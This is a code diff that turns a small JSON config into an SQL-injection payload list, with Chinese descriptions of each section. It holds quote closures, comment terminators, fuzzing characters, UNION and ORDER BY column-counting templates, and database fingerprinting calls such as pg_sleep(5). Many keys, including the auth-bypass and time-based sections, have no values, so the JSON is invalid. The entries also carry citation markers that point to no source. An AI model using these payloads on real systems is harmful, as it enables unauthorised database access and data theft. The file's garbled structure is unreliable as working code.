@@ -1,4 +1,30 @@
 {
   "debug_snippet": true,
-  "closures": ["'", "\"", "'))", "')"]
+  "recon": {
+    "description": "用于初步探测注入点及语意环境闭合",
+    "closures": ["'", "\"", "'))", "')", "\"))", "\")", "`", "]]", "]]"],
+    "terminators": ["--", "#", "-- -", ";%00", "/*", ";", "\\"],
+    "fuzzing_chars": ["'", "''", "`", "``", ",", "\"", "\"\"", "/", "//", "\\", "\\\\", ";", "%00"]
+  },
+  "error_signatures":,
+  "auth_bypass":,
+  "column_counting": {
+    "description": "确定原有查询的列数, 这是执行UNION攻击的前提 [5]",
+    "order_by": " ORDER BY {n}--",
+    "group_by": " GROUP BY {n}--",
+    "union_null": " UNION SELECT {null_chain}--"
+  },
+  "fingerprinting": {
+    "description": "通过特定系统变量或函数确认数据库类型 [1, 6]",
+    "mssql":,
+    "mysql":,
+    "sqlite": ["sqlite_version()", "last_insert_rowid()"],
+    "postgresql": ["version()", "current_database()", "pg_sleep(5)"]
+  },
+  "advanced_extraction": {
+    "boolean_logic":,
+    "structural":,
+    "numeric":
+  },
+  "time_based":
 }
